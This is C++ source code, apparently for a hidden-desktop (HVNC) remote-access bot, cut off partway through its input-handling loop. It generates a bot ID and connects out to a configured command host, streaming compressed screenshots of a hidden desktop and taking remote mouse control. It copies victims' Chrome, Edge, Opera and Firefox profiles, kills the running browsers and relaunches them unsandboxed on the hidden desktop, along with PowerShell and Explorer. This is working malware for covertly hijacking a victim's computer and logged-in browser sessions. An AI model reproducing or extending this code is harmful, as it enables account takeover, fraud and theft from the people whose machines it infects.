#include "StartDesktop.h"
#include <Windowsx.h>
#include <Windows.h>
#include <winsock.h>
#include <Process.h>
#include <Tlhelp32.h>
#include <Winbase.h>
#include <String.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlwapi.h>
#include <tchar.h>
#include <iostream>
#include <Wbemidl.h>
#include <comdef.h>
#include <gdiplus.h>
#include <cstdlib> 
#include <ntstatus.h>
#include <zlib.h>
#include <VersionHelpers.h>



#define BOT_ID_LEN 29

#pragma comment(lib, "wbemuuid.lib")
#pragma comment (lib,"Gdiplus.Lib")
using namespace Gdiplus;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Declare the function pointers
typedef NTSTATUS(NTAPI* T_RtlGetCompressionWorkSpaceSize)(
	USHORT CompressionFormat,
	PULONG CompressBufferWorkSpaceSize,
	PULONG CompressFragmentWorkSpaceSize
	);

typedef NTSTATUS(NTAPI* T_RtlCompressBuffer)(
	USHORT CompressionFormat,
	PUCHAR UncompressedBuffer,
	ULONG UncompressedBufferSize,
	PUCHAR CompressedBuffer,
	ULONG CompressedBufferSize,
	ULONG UncompressedChunkSize,
	PULONG FinalCompressedSize,
	PVOID WorkSpace
	);


typedef BOOL(WINAPI* T_SetThreadDesktop)(HDESK hDesktop);


// Declare the static function pointers
static T_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = NULL;
static T_RtlCompressBuffer RtlCompressBuffer = NULL;



enum Connection { desktop, input };
enum Input { mouse };

static const BYTE     gc_magik[] = { 'J', 'Q', 'R', 'A', 'X', 'Y', 0 };
static const COLORREF gc_trans = RGB(255, 174, 201);
static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format

enum ProStart { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startOpera, startFirefox, startIexplore, startPowershell };

static int        g_port;
static char       g_host[MAX_PATH];
static BOOL       g_started = FALSE;
static BYTE* g_pixels = NULL;
static BYTE* g_oldPixels = NULL;
static BYTE* g_tempPixels = NULL;
static HDESK      g_hDesk;
static BITMAPINFO g_bmpInfo;
static HANDLE     g_hInputThread, g_hDesktopThread;
static char       g_desktopName[MAX_PATH];
static ULARGE_INTEGER lisize;
static LARGE_INTEGER offset;



ULONG PseudoRand(ULONG* seed)
{
	return (*seed = 1352459 * (*seed) + 2529004207);
}


void GetBotId(char* botId)
{
	CHAR windowsDirectory[MAX_PATH];
	CHAR volumeName[8] = { 0 };
	DWORD seed = 0;

	if (!GetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
		windowsDirectory[0] = L'C';

	volumeName[0] = windowsDirectory[0];
	volumeName[1] = ':';
	volumeName[2] = '\\';
	volumeName[3] = '\0';

	GetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);

	GUID guid;
	guid.Data1 = PseudoRand(&seed);

	guid.Data2 = (USHORT)PseudoRand(&seed);
	guid.Data3 = (USHORT)PseudoRand(&seed);
	for (int i = 0; i < 8; i++)
		guid.Data4[i] = (UCHAR)PseudoRand(&seed);

	wsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*)&guid.Data4[2]);
}




void CopyDir(char* from, char* to)
{
	char fromWildCard[MAX_PATH] = { 0 };
	lstrcpyA(fromWildCard, from);
	lstrcatA(fromWildCard, "\\*");

	if (!CreateDirectoryA(to, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return;
	WIN32_FIND_DATAA findData;
	HANDLE hFindFile = FindFirstFileA(fromWildCard, &findData);
	if (hFindFile == INVALID_HANDLE_VALUE)
		return;

	do
	{
		char currFileFrom[MAX_PATH] = { 0 };
		lstrcpyA(currFileFrom, from);
		lstrcatA(currFileFrom, "\\");
		lstrcatA(currFileFrom, findData.cFileName);

		char currFileTo[MAX_PATH] = { 0 };
		lstrcpyA(currFileTo, to);
		lstrcatA(currFileTo, "\\");
		lstrcatA(currFileTo, findData.cFileName);

		if
			(
				findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
				lstrcmpA(findData.cFileName, ".") &&
				lstrcmpA(findData.cFileName, "..")
				)
		{
			if (CreateDirectoryA(currFileTo, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
				CopyDir(currFileFrom, currFileTo);
		}
		else
			CopyFileA(currFileFrom, currFileTo, FALSE);
	} while (FindNextFileA(hFindFile, &findData));
}



void* Alloc(size_t size)
{
	void* mem = malloc(size);
	return mem;
}

void* AllocZ(size_t size)
{
	void* mem = Alloc(size);
	memset(mem, 0, size);
	return mem;
}
void ConvertBmpToJpg(HDC dc, HBITMAP bmp, int w, int h) {
	static ULONG_PTR gdiToken = 0;
	static bool isGdiInit = false;
	if (!isGdiInit) {
		GdiplusStartupInput gdiplusInput;
		GdiplusStartup(&gdiToken, &gdiplusInput, NULL);
		isGdiInit = true;
	}

	Bitmap img(bmp, NULL);
	IStream* stream = NULL;
	CreateStreamOnHGlobal(NULL, TRUE, &stream);
	img.Save(stream, &jpegID, NULL);

	Bitmap* compressedImg = Bitmap::FromStream(stream);
	HBITMAP compressedBmp;
	compressedImg->GetHBITMAP(Color::White, &compressedBmp);
	delete compressedImg;
	stream->Release();

	GetDIBits(dc, compressedBmp, 0, h, g_pixels, &g_bmpInfo, DIB_RGB_COLORS);
	DeleteObject(compressedBmp);
}

static BOOL RenderWnd(HWND wnd, HDC dc, HDC screenDc) {
	BOOL result = FALSE;
	RECT r;
	GetWindowRect(wnd, &r);

	HDC wndDc = CreateCompatibleDC(dc);
	if (wndDc) {
		HBITMAP wndBmp = CreateCompatibleBitmap(dc, r.right - r.left, r.bottom - r.top);
		if (wndBmp) {
			HGDIOBJ oldBmp = SelectObject(wndDc, wndBmp);
			if (PrintWindow(wnd, wndDc, 0)) {
				BitBlt(screenDc, r.left, r.top, r.right - r.left, r.bottom - r.top, wndDc, 0, 0, SRCCOPY);
				result = TRUE;
			}
			SelectObject(wndDc, oldBmp);
			DeleteObject(wndBmp);
		}
		DeleteDC(wndDc);
	}
	return result;
}

static void EnumWnds(HWND owner, WNDENUMPROC proc, LPARAM param) {
	HWND wnd = GetTopWindow(owner);
	if (wnd == NULL) return;
	if ((wnd = GetWindow(wnd, GW_HWNDLAST)) == NULL) return;
	while (proc(wnd, param) && (wnd = GetWindow(wnd, GW_HWNDPREV)) != NULL);
}

struct PrintData {
	HDC dc;
	HDC screenDc;
};

static BOOL CALLBACK EnumPrint(HWND wnd, LPARAM lParam) {
	PrintData* data = (PrintData*)lParam;

	if (!IsWindowVisible(wnd))
		return TRUE;

	RenderWnd(wnd, data->dc, data->screenDc);

	DWORD st = GetWindowLongA(wnd, GWL_EXSTYLE);
	SetWindowLongA(wnd, GWL_EXSTYLE, st | WS_EX_COMPOSITED);

	if (!IsWindowsVistaOrGreater()) {
		EnumWnds(wnd, EnumPrint, (LPARAM)data);
	}
	return TRUE;
}

static BOOL CaptureDeskPixels(int srvW, int srvH) {
	RECT r;
	HWND deskWnd = GetDesktopWindow();
	GetWindowRect(deskWnd, &r);

	HDC dc = GetDC(NULL);
	HDC screenDc = CreateCompatibleDC(dc);
	HBITMAP screenBmp = CreateCompatibleBitmap(dc, r.right, r.bottom);
	SelectObject(screenDc, screenBmp);

	PrintData data;
	data.dc = dc;
	data.screenDc = screenDc;

	EnumWnds(NULL, EnumPrint, (LPARAM)&data);

	if (srvW > r.right)
		srvW = r.right;
	if (srvH > r.bottom)
		srvH = r.bottom;

	if (srvW != r.right || srvH != r.bottom) {
		HBITMAP resizedBmp = CreateCompatibleBitmap(dc, srvW, srvH);
		HDC resizedDc = CreateCompatibleDC(dc);

		SelectObject(resizedDc, resizedBmp);
		SetStretchBltMode(resizedDc, HALFTONE);
		StretchBlt(resizedDc, 0, 0, srvW, srvH, screenDc, 0, 0, r.right, r.bottom, SRCCOPY);

		DeleteObject(screenBmp);
		DeleteDC(screenDc);

		screenBmp = resizedBmp;
		screenDc = resizedDc;
	}

	BOOL compare = TRUE;
	g_bmpInfo.bmiHeader.biSizeImage = srvW * 3 * srvH;

	if (g_pixels == NULL || (g_bmpInfo.bmiHeader.biWidth != srvW || g_bmpInfo.bmiHeader.biHeight != srvH)) {
		free((HLOCAL)g_pixels);
		free((HLOCAL)g_oldPixels);
		free((HLOCAL)g_tempPixels);

		g_pixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_oldPixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);
		g_tempPixels = (BYTE*)Alloc(g_bmpInfo.bmiHeader.biSizeImage);

		compare = FALSE;
	}

	g_bmpInfo.bmiHeader.biWidth = srvW;
	g_bmpInfo.bmiHeader.biHeight = srvH;
	ConvertBmpToJpg(screenDc, screenBmp, srvW, srvH);

	DeleteObject(screenBmp);
	ReleaseDC(NULL, dc);
	DeleteDC(screenDc);

	if (compare) {
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage; i += 3) {
			if (g_pixels[i] == GetRValue(gc_trans) &&
				g_pixels[i + 1] == GetGValue(gc_trans) &&
				g_pixels[i + 2] == GetBValue(gc_trans)) {
				++g_pixels[i + 1];
			}
		}

		memcpy(g_tempPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);

		BOOL isSame = TRUE;
		for (DWORD i = 0; i < g_bmpInfo.bmiHeader.biSizeImage - 1; i += 3) {
			if (g_pixels[i] == g_oldPixels[i] &&
				g_pixels[i + 1] == g_oldPixels[i + 1] &&
				g_pixels[i + 2] == g_oldPixels[i + 2]) {
				g_pixels[i] = GetRValue(gc_trans);
				g_pixels[i + 1] = GetGValue(gc_trans);
				g_pixels[i + 2] = GetBValue(gc_trans);
			}
			else
				isSame = FALSE;
		}
		if (isSame)
			return TRUE;

		memcpy(g_oldPixels, g_tempPixels, g_bmpInfo.bmiHeader.biSizeImage);
	}
	else
		memcpy(g_oldPixels, g_pixels, g_bmpInfo.bmiHeader.biSizeImage);
	return FALSE;
}


static SOCKET EstablishConnection() {
	WSADATA wsa;
	SOCKET sock;
	SOCKADDR_IN addr;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return NULL;
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return NULL;

	hostent* host = gethostbyname(g_host);
	memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(g_port);

	if (connect(sock, (sockaddr*)&addr, sizeof(addr)) < 0)
		return NULL;

	return sock;
}

static int SendInteger(SOCKET sock, int i) {
	return send(sock, (char*)&i, sizeof(i), 0);
}

static DWORD WINAPI DesktopThread(LPVOID param)
{
	SOCKET s = EstablishConnection();

	// Load ntdll.dll and get function addresses
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll == NULL)
	{
		printf("Failed to load ntdll.dll.\n");
		return 1; // Exit with error
	}

	RtlGetCompressionWorkSpaceSize = (T_RtlGetCompressionWorkSpaceSize)GetProcAddress(hNtdll, "RtlGetCompressionWorkSpaceSize");
	RtlCompressBuffer = (T_RtlCompressBuffer)GetProcAddress(hNtdll, "RtlCompressBuffer");

	if (RtlGetCompressionWorkSpaceSize == NULL || RtlCompressBuffer == NULL)
	{
		printf("Failed to get function addresses.\n");
		FreeLibrary(hNtdll);
		return 1; // Exit with error
	}

	// Load user32.dll and get the SetThreadDesktop function
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL)
	{
		printf("Failed to load user32.dll.\n");
		FreeLibrary(hNtdll);
		return 1; // Exit with error
	}

	T_SetThreadDesktop SetThreadDesktopFunc = (T_SetThreadDesktop)GetProcAddress(hUser32, "SetThreadDesktop");
	if (SetThreadDesktopFunc == NULL)
	{
		printf("Failed to get SetThreadDesktop function address.\n");
		FreeLibrary(hUser32);
		FreeLibrary(hNtdll);
		return 1; // Exit with error
	}

	if (!SetThreadDesktopFunc(g_hDesk))
		goto exit;

	if (send(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0)
		goto exit;
	if (SendInteger(s, Connection::desktop) <= 0)
		goto exit;

	for (;;)
	{
		int width, height;

		if (recv(s, (char*)&width, sizeof(width), 0) <= 0)
			goto exit;
		if (recv(s, (char*)&height, sizeof(height), 0) <= 0)
			goto exit;

		BOOL same = CaptureDeskPixels(width, height);
		if (same)
		{
			if (SendInteger(s, 0) <= 0)
				goto exit;
			continue;
		}

		if (SendInteger(s, 1) <= 0)
			goto exit;

	

		ULONG workSpaceSize;
		ULONG fragmentWorkSpaceSize;
		RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize);
		

		if (RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1, &workSpaceSize, &fragmentWorkSpaceSize) != 0)
		{
			printf("Failed to get compression workspace size.\n");
			goto exit;
		}

		BYTE* workSpace = (BYTE*)Alloc(workSpaceSize);
		if (workSpace == NULL)
		{
			printf("Failed to allocate workspace.\n");
			goto exit;
		}

		DWORD size;
		NTSTATUS status = RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1,
			g_pixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			g_tempPixels,
			g_bmpInfo.bmiHeader.biSizeImage,
			2048,
			&size,
			workSpace);

		if (!NT_SUCCESS(status))
		{
			printf("Failed to compress buffer. Error code: 0x%x\n", status);
			free(workSpace);
			goto exit;
		}


		free(workSpace);

		RECT rect;
		HWND hWndDesktop = GetDesktopWindow();
		GetWindowRect(hWndDesktop, &rect);
		if (SendInteger(s, rect.right) <= 0)
			goto exit;
		if (SendInteger(s, rect.bottom) <= 0)
			goto exit;
		if (SendInteger(s, g_bmpInfo.bmiHeader.biWidth) <= 0)
			goto exit;
		if (SendInteger(s, g_bmpInfo.bmiHeader.biHeight) <= 0)
			goto exit;
		if (SendInteger(s, size) <= 0)
			goto exit;
		if (send(s, (char*)g_tempPixels, size, 0) <= 0)
			goto exit;

		DWORD response;
		if (recv(s, (char*)&response, sizeof(response), 0) <= 0)
			goto exit;
	}

exit:
	TerminateThread(g_hInputThread, 0);
	FreeLibrary(hUser32); // Free the user32 library
	FreeLibrary(hNtdll);  // Free the ntdll library
	return 0;
}








static void killproc(const char* name)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (strcmp(pEntry.szExeFile, name) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}



// Function to retrieve the process ID based on the command line search string
int GetProcessViaCommandLine(const std::string& processName, const std::string& searchString) {
	HRESULT hr;
	IWbemLocator* pLoc = NULL;
	IWbemServices* pSvc = NULL;
	IEnumWbemClassObject* pEnumerator = NULL;
	IWbemClassObject* pclsObj = NULL;
	ULONG uReturn = 0;

	// Initialize COM
	hr = CoInitializeEx(0, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		std::cerr << "Failed to initialize COM library. Error code = 0x" << std::hex << hr << std::endl;
		return -1;
	}

	// Set general COM security levels
	hr = CoInitializeSecurity(
		NULL,
		-1,
		NULL,
		NULL,
		RPC_C_AUTHN_LEVEL_DEFAULT,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_NONE,
		NULL
	);

	if (FAILED(hr)) {
		std::cerr << "Failed to initialize security. Error code = 0x" << std::hex << hr << std::endl;
		CoUninitialize();
		return -1;
	}

	// Obtain the initial locator to WMI
	hr = CoCreateInstance(
		CLSID_WbemLocator,
		0,
		CLSCTX_INPROC_SERVER,
		IID_IWbemLocator,
		(LPVOID*)&pLoc
	);

	if (FAILED(hr)) {
		std::cerr << "Failed to create IWbemLocator object. Error code = 0x" << std::hex << hr << std::endl;
		CoUninitialize();
		return -1;
	}

	// Connect to the root\cimv2 namespace with the current user and obtain pointer pSvc
	hr = pLoc->ConnectServer(
		_bstr_t(L"ROOT\\CIMV2"),
		NULL,
		NULL,
		0,
		NULL,
		0,
		0,
		&pSvc
	);

	if (FAILED(hr)) {
		std::cerr << "Could not connect to WMI namespace. Error code = 0x" << std::hex << hr << std::endl;
		pLoc->Release();
		CoUninitialize();
		return -1;
	}

	// Set security levels on the proxy
	hr = CoSetProxyBlanket(
		pSvc,
		RPC_C_AUTHN_WINNT,
		RPC_C_AUTHZ_NONE,
		NULL,
		RPC_C_AUTHN_LEVEL_CALL,
		RPC_C_IMP_LEVEL_IMPERSONATE,
		NULL,
		EOAC_NONE
	);

	if (FAILED(hr)) {
		std::cerr << "Could not set proxy blanket. Error code = 0x" << std::hex << hr << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return -1;
	}

	// Query for processes with the specified name
	std::wstring query = L"SELECT * FROM Win32_Process WHERE Name = '" + std::wstring(processName.begin(), processName.end()) + L"'";
	hr = pSvc->ExecQuery(
		bstr_t("WQL"),
		bstr_t(query.c_str()),
		WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
		NULL,
		&pEnumerator
	);

	if (FAILED(hr)) {
		std::cerr << "Query for processes failed. Error code = 0x" << std::hex << hr << std::endl;
		pSvc->Release();
		pLoc->Release();
		CoUninitialize();
		return -1;
	}

	// Iterate over the results and check the command line
	int processId = -1;
	while (pEnumerator) {
		hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
		if (0 == uReturn) {
			break;
		}

		VARIANT vtProp;
		hr = pclsObj->Get(L"CommandLine", 0, &vtProp, 0, 0);
		if (SUCCEEDED(hr) && vtProp.vt == VT_BSTR) {
			std::wstring commandLine = vtProp.bstrVal;
			if (commandLine.find(std::wstring(searchString.begin(), searchString.end())) != std::wstring::npos) {
				hr = pclsObj->Get(L"ProcessId", 0, &vtProp, 0, 0);
				if (SUCCEEDED(hr)) {
					processId = vtProp.intVal;
				}
			}
		}
		VariantClear(&vtProp);
		pclsObj->Release();
	}

	// Cleanup
	pSvc->Release();
	pLoc->Release();
	pEnumerator->Release();
	CoUninitialize();

	return processId;
}

// Function to terminate a process by its process ID
void KillProcessById(int processId) {
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
	if (hProcess == NULL) {
		std::cerr << "Failed to open process. Error code = " << GetLastError() << std::endl;
		return;
	}

	if (!TerminateProcess(hProcess, 0)) {
		std::cerr << "Failed to terminate process. Error code = " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Process terminated successfully." << std::endl;
	}

	CloseHandle(hProcess);
}

void StartChrome()
{
	// Retrieve the local app data path
	char localAppDataPath[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppDataPath);

	// Construct the original and new data paths
	char originalDataPath[MAX_PATH];
	char newDataPath[MAX_PATH];
	snprintf(originalDataPath, sizeof(originalDataPath), "%s%s", localAppDataPath, "User Data\\");
	snprintf(newDataPath, sizeof(newDataPath), "%s%s", localAppDataPath, "\\Google\\Chrome\\");

	char botId[BOT_ID_LEN] = { 0 };
	GetBotId(botId);
	strncat_s(newDataPath, sizeof(newDataPath), botId, _TRUNCATE);

	// Copy the original Chrome data directory to the new data path
	CopyDir(originalDataPath, newDataPath);

	// Search and terminate existing Chrome instances with "ChromeAutomationData"
	int pid = GetProcessViaCommandLine("chrome.exe", "ChromeAutomationData");
	if (pid != -1)
	{
		KillProcessById(pid);
	}

	// Set up the process startup information
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;

	// Launch Chrome directly with necessary arguments
	char command[MAX_PATH];
	snprintf(command, sizeof(command), "cmd.exe /c start chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"%s\" ChromeAutomationData", newDataPath);

	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&startupInfo,
		&processInfo
	);
}



static void StartEdge()
{
	// Retrieve the local app data path
	char localAppDataPath[MAX_PATH];
	  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppDataPath);

	// Construct the original and new data paths for Edge
	char originalDataPath[MAX_PATH];
	char newDataPath[MAX_PATH];
	snprintf(originalDataPath, sizeof(originalDataPath), "%s%s", localAppDataPath, "\\Microsoft\\Edge\\User Data");
	snprintf(newDataPath, sizeof(newDataPath), "%s%s", localAppDataPath, "\\Microsoft\\Edge\\CustomData");

	char botId[BOT_ID_LEN] = { 0 };
	GetBotId(botId);
	strncat_s(newDataPath, botId, sizeof(newDataPath) - strlen(newDataPath) - 1);

	// Copy the original Edge data directory to the new data path
	CopyDir(originalDataPath, newDataPath);

	// Search and terminate existing Edge instances with "EdgeAutomationData"
	int pid = GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
	if (pid != -1)
	{
		KillProcessById(pid);
	}

	// Set up the process startup information
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;

	// Launch Edge directly with necessary arguments
	char command[MAX_PATH];
	snprintf(command, sizeof(command), "cmd.exe /c start msedge.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=\"%s\" EdgeAutomationData", newDataPath);

	PROCESS_INFORMATION processInfo = { 0 };
	  CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&startupInfo,
		&processInfo
	);
}




static void StartOpera() {
	// Retrieve the local app data path
	char localAppDataPath[MAX_PATH];
	  SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppDataPath);

	// Construct the original and new data paths for Opera
	char originalDataPath[MAX_PATH];
	char newDataPath[MAX_PATH];
	snprintf(originalDataPath, sizeof(originalDataPath), "%s%s", localAppDataPath, "\\Opera Software\\Opera Stable");
	snprintf(newDataPath, sizeof(newDataPath), "%s%s", localAppDataPath, "\\Opera Software\\CustomData");

	char botId[BOT_ID_LEN] = { 0 };
	GetBotId(botId);
	strncat_s(newDataPath, botId, sizeof(newDataPath) - strlen(newDataPath) - 1);

	// Copy the original Opera data directory to the new data path
	CopyDir(originalDataPath, newDataPath);

	// Search and terminate existing Opera instances with "OperaAutomationData"
	int pid = GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
	if (pid != -1) {
		KillProcessById(pid);
	}

	// Set up the process startup information
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = NULL;

	// Launch Opera directly with necessary arguments
	char command[MAX_PATH];
	snprintf(command, sizeof(command), "cmd.exe /c start opera.exe --user-data-dir=\"%s\" OperaAutomationData", newDataPath);

	PROCESS_INFORMATION processInfo = { 0 };
	  CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&startupInfo,
		&processInfo
	);
}

void StartFirefox()
{
	// Retrieve the local app data path
	char localAppDataPath[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppDataPath);

	// Construct the original and new data paths for Firefox
	char originalDataPath[MAX_PATH];
	char newDataPath[MAX_PATH];
	snprintf(originalDataPath, sizeof(originalDataPath), "%s\\Mozilla\\Firefox\\Profiles\\", localAppDataPath);
	snprintf(newDataPath, sizeof(newDataPath), "%s\\Mozilla\\Firefox\\CustomProfiles\\", localAppDataPath);

	char botId[BOT_ID_LEN] = { 0 };
	GetBotId(botId);
	strncat_s(newDataPath, sizeof(newDataPath), botId, _TRUNCATE);

	// Copy the original Firefox profile directory to the new data path
	CopyDir(originalDataPath, newDataPath);

	// Search and terminate existing Firefox instances
	int pid = GetProcessViaCommandLine("firefox.exe", "firefox");
	if (pid != -1)
	{
		KillProcessById(pid);
	}

	// Set up the process startup information
	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;

	// Launch Firefox directly with necessary arguments
	char command[MAX_PATH];
	snprintf(command, sizeof(command), "cmd.exe /c start firefox.exe -no-remote -profile \"%s\"", newDataPath);

	PROCESS_INFORMATION processInfo = { 0 };
	CreateProcessA(
		NULL,
		command,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&startupInfo,
		&processInfo
	);
}


static void StartBrave()
{
	killproc("brave.exe");
	char path[MAX_PATH] = { 0 };
	  lstrcpyA(path, "cmd.exe /c start ");
	  lstrcatA(path, "brave.exe");
	  lstrcatA(path, " --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=");

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	  CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}



static void StartPowershell()
{
	char path[MAX_PATH] = { 0 };
	  lstrcpyA(path, "cmd.exe /c start ");
	  lstrcatA(path, "powershell -noexit -command \"[console]::windowwidth = 100;[console]::windowheight = 30; [console]::bufferwidth = [console]::windowwidth\"" );

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	  CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static void StartIe()
{
	char path[MAX_PATH] = { 0 };
	  lstrcpyA(path, "cmd.exe /c start ");
	  lstrcatA(path, "iexplore.exe");

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(startupInfo);
	startupInfo.lpDesktop = g_desktopName;
	PROCESS_INFORMATION processInfo = { 0 };
	  CreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
}

static DWORD WINAPI InputThread(LPVOID param)
{
	SOCKET s = EstablishConnection();

	  SetThreadDesktop(g_hDesk);

	if (  send(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0)
		return 0;
	if (SendInteger(s, Connection::input) <= 0)
		return 0;

	DWORD response;
	if (!  recv(s, (char*)&response, sizeof(response), 0))
		return 0;

	g_hDesktopThread =   CreateThread(NULL, 0, DesktopThread, NULL, 0, 0);

	POINT      lastPoint;
	BOOL       lmouseDown = FALSE;
	HWND       hResMoveWindow = NULL;
	LRESULT    resMoveType = NULL;

	lastPoint.x = 0;
	lastPoint.y = 0;

	for (;;)
	{
		UINT   msg;
		WPARAM wParam;
		LPARAM lParam;

		if (  recv(s, (char*)&msg, sizeof(msg), 0) <= 0)
			goto exit;
		if (  recv(s, (char*)&wParam, sizeof(wParam), 0) <= 0)
			goto exit;
		if (  recv(s, (char*)&lParam, sizeof(lParam), 0) <= 0)
			goto exit;

		HWND  hWnd{};
		POINT point;
		POINT lastPointCopy;
		BOOL  mouseMsg = FALSE;

		switch (msg)
		{
		case ProStart::startExplorer:
		{
			const DWORD neverCombine = 2;
			const char* valueName = "TaskbarGlomLevel";

			
			HKEY hKey;
			  RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_ALL_ACCESS, &hKey);
			DWORD value;
			DWORD size = sizeof(DWORD);
			DWORD type = REG_DWORD;
			  RegQueryValueExA(hKey, valueName, 0, &type, (BYTE*)&value, &size);

			if (value != neverCombine)
				  RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&neverCombine, size);

			char explorerPath[MAX_PATH] = { 0 };
			  GetWindowsDirectoryA(explorerPath, MAX_PATH);
			  lstrcatA(explorerPath, "\\");
			  lstrcatA(explorerPath, "explorer.exe");

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			  CreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

			APPBARDATA appbarData;
			appbarData.cbSize = sizeof(appbarData);
			for (int i = 0; i < 5; ++i)
			{
				Sleep(1000);
				appbarData.hWnd =   FindWindowA("Shell_TrayWnd", NULL);
				if (appbarData.hWnd)
					break;
			}

			appbarData.lParam = ABS_ALWAYSONTOP;
			  SHAppBarMessage(ABM_SETSTATE, &appbarData);

			  RegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)&value, size);
			  RegCloseKey(hKey);
			break;
		}
		case ProStart::startRun:
		{
			char rundllPath[MAX_PATH] = { 0 };
			  SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
			lstrcatA(rundllPath, "\\rundll32.exe shell32.dll,#61");

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			CreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
			break;
		}
		case ProStart::startPowershell:
		{
